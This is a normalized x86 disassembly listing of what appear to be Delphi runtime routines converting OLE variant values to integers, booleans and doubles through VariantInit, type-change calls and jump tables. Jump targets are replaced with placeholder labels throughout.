push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f770
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fe32 ]
jmp [ eax * 4 + jump_table_40fe45 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403228
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e5d4
sub_40fee8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_40ffad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410234
test edx edx
je r-xdata
mov al [ eax + lookup_table_40ff0e ]
jmp [ eax * 4 + jump_table_40ff22 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403228
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e5d4
sub_40ffd0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402b18
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40ea14
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410830
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_41007c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41016a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4127d0
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408384
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410171
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0xc ]
call sub_404718
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402b18
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40ea14
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410830
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_41017c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4101d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f0e0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410234
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4101da
lea eax [ ebp - 0x18 ]
call sub_40edb8
retn
sub_4101e8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4139fc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410234
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410640
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410267 ]
mov eax [ ebp - 0x4 ]
call sub_41007c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b18
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b18
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402b18
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b18
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41007c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410234
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ffd0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41017c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e5d4
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4101e8
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ffd0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_40ffd0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41048b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b18
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b18
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402b18
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b18
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41007c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410234
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410678
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41072f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_4127d0
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_408470
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410736
lea eax [ ebp - 0x10 ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404718
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40ea14
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40ea14
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410740
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40ea14
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410780
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4107d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f0e0
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410830
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4107db
lea eax [ ebp - 0x11 ]
call sub_40edb8
retn
sub_4107e4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4139fc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410830
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41084a ]
mov eax ebx
call sub_410678
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410678
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410830
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410740
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410780
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e5d4
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4107e4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410740
mov [ esp ] al
mov eax ebx
call sub_410740
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_410a0c ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410678
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410830
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410b78
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410c2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4127d0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_4096a4
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40ea14
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40ea14
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c34
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0xc ]
call sub_404718
retn
sub_410c3c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40ea14
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_410c88
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410cdd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f0e0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410d38
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410ce4
lea eax [ ebp - 0x18 ]
call sub_40edb8
retn
sub_410cec
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4139fc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410d38
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410d54 ]
mov eax ebx
call sub_410b78
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410b78
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410d38
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410c3c
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_410c88
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e5d4
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410cec
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410c3c
fstp [ esp ]
fwait
mov eax ebx
call sub_410c3c
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410f31 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410b78
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410d38
fstp [ esp ]
fwait
jmp r-xdata
sub_4110b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_411219
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410d38
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4110d6 ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
